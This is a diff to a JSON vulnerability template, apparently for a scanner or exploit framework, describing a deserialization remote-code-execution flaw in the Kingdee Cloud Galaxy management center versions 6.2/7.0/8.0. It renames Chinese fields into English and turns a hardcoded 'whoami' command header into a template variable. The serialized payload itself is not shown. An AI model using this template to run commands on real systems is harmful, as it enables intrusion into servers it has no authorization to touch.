@@ -1,12 +1,12 @@
 {
   "vulnerability": {
-    "name": "金蝶云星空管理中心反序列化rce漏洞",
+    "name": "JinDieYun manage rce vul",
     "type": [
       "RCE"
     ],
     "affected_software": [
       {
-        "name": "金蝶云星空-管理中心",
+        "name": "JinDieYun manage",
         "version": "6.2/7.0/8.0"
       }
     ],
@@ -31,7 +31,7 @@
               "Accept": "*/*",
               "Accept-Encoding": "gzip, deflate",
               "Content-Type": "text/json",
-              "cmd":"whoami",
+              "cmd":"{{ variables.value }}",
               "Content-Length": 15909
           },
         "body": null
